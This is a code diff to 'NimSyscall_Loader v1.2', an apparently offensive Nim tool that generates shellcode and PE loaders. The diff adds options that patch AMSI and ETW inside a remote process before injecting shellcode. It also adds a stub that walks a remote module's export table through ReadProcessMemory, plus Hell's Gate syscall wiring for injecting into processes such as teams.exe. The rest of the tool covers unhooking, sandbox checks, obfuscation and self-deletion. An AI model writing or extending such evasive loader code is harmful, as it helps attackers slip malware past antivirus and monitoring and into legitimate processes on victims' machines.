@@ -54,7 +54,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.2
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain>]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --remoteprocess=<processnames> --csharp --noAMSI --noETW --sleep=<10> --shellcode --COMVARETW --remoteinject --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --noArgs --peinject --peload --hellsgate --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain>]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -74,6 +74,8 @@ Options:
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
   --remoteprocess procname    Injects into the specified remote process name, e.g. teams.exe. The loader searches for the first process with that name
                      Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
+  --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
+  --remotepatchETW    Patch ETW in the remote process before shellcode execution
   --unhook    Unhook ntdll.dll before doing anything else for the current process
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation (not possible in combination with --reflective)
@@ -127,6 +129,8 @@ var
     selfdelete: bool = false
     remoteprocess: string = ""
     remoteprocessesstring: string
+    remoteAMSIpatch: bool = false
+    remoteETWpatch: bool = false
     replace: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.2")
@@ -150,6 +154,12 @@ if args["--remoteprocess"]:
   echo processname
   remoteprocesses = processname.split(',')
   echo remoteprocesses
+
+if args["--remotepatchAMSI"]:
+  remoteAMSIpatch = true
+
+if args["--remotepatchETW"]:
+  remoteETWpatch = true
 
 if args["--csharp"]:
   csharp = true
@@ -330,7 +340,7 @@ when isMainModule:
 """
 
 let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
-    var remoteprocesses: seq[string] = {remoteprocesses}
+var remoteprocesses: seq[string] = {remoteprocesses}
 """
 
 let Cryptstub1 = """
@@ -414,6 +424,109 @@ dctx.clear()
 
 """
 
+let RemoteModuleHandleStub = """
+
+# Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim
+
+from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
+
+proc ConvertToString(CharArr :array[256,char]): string =
+    var index = 0
+    while CharArr[index] != '\x00':
+        result.add(CharArr[index])
+        index += 1
+
+proc GetRemoteModuleHandle * (hProcess:HANDLE, ModuleName: string): HMODULE =
+    var 
+        modEntry : MODULEENTRY32A
+        snapshot : HANDLE
+
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
+    if snapshot != INVALID_HANDLE_VALUE:
+        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
+        if Module32FirstA(snapshot, addr modEntry):
+            while Module32NextA(snapshot, addr modEntry):
+                if ConvertToString(modEntry.szModule) == ModuleName:
+                    return modEntry.hModule
+    CloseHandle(snapshot)
+    return 0
+
+proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
+    var
+        baseModule : UINT_PTR = cast[UINT64](hModule)
+        dosHeader : IMAGE_DOS_HEADER
+        ntHeader : IMAGE_NT_HEADERS
+        exportDirectory : IMAGE_EXPORT_DIRECTORY
+        ExportTable : DWORD = 0
+        ExportFunctionTableVA : UINT_PTR = 0
+        ExportNameTableVA : UINT_PTR = 0
+        ExportOrdinalTableVA  : UINT_PTR = 0
+        ExportNameTable: seq[DWORD]
+        ExportFunctionTable: seq[DWORD]
+        ExportOrdinalsTable: seq[WORD] 
+        MinFunNumber : UINT_PTR  = 0
+        Func : DWORD = 0
+        Ord : WORD = 0
+        CharIndex : UINT_PTR = 0
+        TempChar : char
+        Done : bool = false
+        TempFunctionName : string = ""
+
+    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
+        echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
+        return NULL
+    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
+        echo obf("Failed to Read and check the NT signature: "), GetlastError()
+        return NULL
+
+    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
+    
+    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
+        echo obf("Failed to Read the main export table "), GetlastError()
+
+    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
+    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
+    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
+    
+    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
+        Func = 0
+        Ord = 0 
+        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+            echo obf("Failed to copy name table "), GetlastError()
+            return NULL
+        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
+            echo obf("Failed to copy Ordinal table "), GetlastError()
+            return NULL
+        ExportNameTable.add(Func)
+        ExportOrdinalsTable.add(Ord)
+    
+    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
+        Func = 0
+        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
+            echo obf("Failed to copy fucntion table "), GetlastError()
+            return NULL
+        ExportFunctionTable.add(Func)
+    
+    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
+        CharIndex = 0
+        Done = false
+        TempFunctionName = ""
+        while Done == false:
+            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
+                echo obf("Failed to read the names of the functions"), GetlastError()
+                return NULL
+            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
+                Done = true
+            else:
+                TempFunctionName.add(TempChar)
+            CharIndex += 1
+        if TempFunctionName == FuncName:
+            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
+    echo obf("[X] Proc name does not exits")
+    return NULL
+
+"""
+
 
 var stub = Cryptstub1
 
@@ -454,8 +567,11 @@ if(unhook):
         stub.add(UnhookSyscalls)
         stub.add(UnhookStub)
 
-# Only decrypt when sandbox Checks/nhooking/Sleep is done
+# Only decrypt when sandbox Checks/Unhooking/Sleep is done
 stub = stub & Cryptstub2 & Cryptstub3
+
+if (remoteETWpatch or remoteAMSIpatch):
+    stub.add(RemoteModuleHandleStub)
 
 if (hellsgate):  
     stub.add(WinLeanGetCurrentProcStub)
@@ -480,17 +596,49 @@ if (hellsgate):
                 if ("NtProtectVirtualMemory(" in stub) == false:
                     stub.add(HellsgateProtectDelegate)
                 stub = stub & HellsgateETWPatchStub
+    if (peload):
+        if ("NtAllocateVirtualMemory(" in stub) == false:
+            stub.add(HellsgateAllocDelegate)
+        stub.add(HellsPELoadStub)
+        peload = false
+        localinject = false
     if(localinject and (csharp == false)):
         if ("NtAllocateVirtualMemory(" in stub) == false:
             stub.add(HellsgateAllocDelegate)
         stub = stub & HellsgateLocalInjectStub
-    if ((localinject == false) and (csharp == false)):
-        # ToDo - not ready yet
+    if ((localinject == false) and (csharp == false) and (("fixIAT*(m" in stub) == false)):
         stub.add(RemoteProcImportStub)
+        if ("NtOpenProcess(" in stub) == false:
+            stub.add(HellsgateNtOpenProcessDelegate)
+        if ("NtAllocateVirtualMemory(" in stub) == false:
+            stub.add(HellsgateAllocDelegate)
+        if ("NtCreateThreadEx(" in stub) == false:
+            stub.add(HellsgateNtCreateThreadExDelegate)
+        if ("NtClose(" in stub) == false:
+            stub.add(HellsgateNtCloseDelegate)
         if (processname == ""):
-            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
+            stub = stub & HellsgateNotepadProcIDStub
+            if (remoteETWpatch):
+                if ("NtProtectVirtualMemory(" in stub) == false:
+                    stub.add(HellsgateProtectDelegate)
+                stub.add(HellsgateRemotePatchETWStub)
+            if (remoteAMSIpatch):
+                if ("NtProtectVirtualMemory(" in stub) == false:
+                    stub.add(HellsgateProtectDelegate)
+                stub.add(HellsgateRemotePatchAMSIStub)
+            stub.add(HellsShellcoderemoteinjectStub_notepad)
+            stub.add(HellsShellcoderemoteinjectStub)  
         else:
-            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & ShellcoderemoteinjectStub_customprocthird & ShellcoderemoteinjectStub
+            stub = stub & HellsShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & HellsShellcoderemoteinjectStub_customprocID
+            if (remoteETWpatch):
+                if ("NtProtectVirtualMemory(" in stub) == false:
+                    stub.add(HellsgateProtectDelegate)
+                stub.add(HellsgateRemotePatchETWStub)
+            if (remoteAMSIpatch):
+                if ("NtProtectVirtualMemory(" in stub) == false:
+                    stub.add(HellsgateProtectDelegate)
+                stub.add(HellsgateRemotePatchAMSIStub) 
+            stub = stub & HellsShellcoderemoteinjectStub_customprocthird & HellsShellcoderemoteinjectStub
     if (csharp):
         stub.add(AssemblyImports)
         echo "adding Stub:"
@@ -541,9 +689,19 @@ if (shellcode):
     else:
         stub.add(RemoteProcImportStub)
         if (processname == ""):
-            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
+            stub = stub & RemoteInjectDelegates & NotepadProcIDStub
+            if (remoteETWpatch):
+                stub.add(RemotePatchETWStub)
+            if (remoteAMSIpatch):
+                stub.add(RemotePatchAMSIStub)
+            stub = stub & ShellcoderemoteinjectStub_notepad & ShellcoderemoteinjectStub  
         else:
-            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & ShellcoderemoteinjectStub_customprocthird & ShellcoderemoteinjectStub
+            stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & ShellcoderemoteinjectStub_customprocID
+            if (remoteETWpatch):
+                stub.add(RemotePatchETWStub)
+            if (remoteAMSIpatch):
+                stub.add(RemotePatchAMSIStub)
+            stub = stub & ShellcoderemoteinjectStub_customprocthird & ShellcoderemoteinjectStub
 
 if (csharp):
     stub.add(AssemblyImports)
